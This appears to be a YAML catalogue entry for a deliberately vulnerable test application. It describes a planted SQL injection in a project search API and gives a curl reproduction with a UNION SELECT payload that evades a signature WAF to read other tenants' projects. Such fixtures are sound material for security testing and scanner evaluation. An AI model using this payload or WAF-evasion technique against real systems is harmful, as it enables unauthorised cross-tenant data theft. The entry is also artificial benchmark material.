  - id: API-SQLI-001
    title: SQL injection in project search (cross-tenant read, behind a signature WAF)
    class: SQLInjection
    cwe: CWE-89
    owasp: "A03:2021"
    tier: 1
    origin: api
    endpoint: "GET /api/projects/search"
    severity: Critical
    auth: user
    detector: diver_sqli
    gating: VF_HARDENED
    defense: signature-waf
    deterministic: true
    secured_twin: API-SQLI-001-SAFE
    intentional: true
    repro: |
      # q is concatenated into the SQL. A signature WAF blocks the canonical
      # `' OR '1'='1' --` (403), so pivot to a UNION SELECT (no OR, no comment):
      curl -G http://localhost:8081/api/projects/search \
        -H "Authorization: Bearer <alice_token>" \
        --data-urlencode "q=' UNION SELECT id,org_id,name,description,status FROM projects WHERE name LIKE '"
      # -> 200 with projects from every org (org_id filter bypassed cross-tenant).

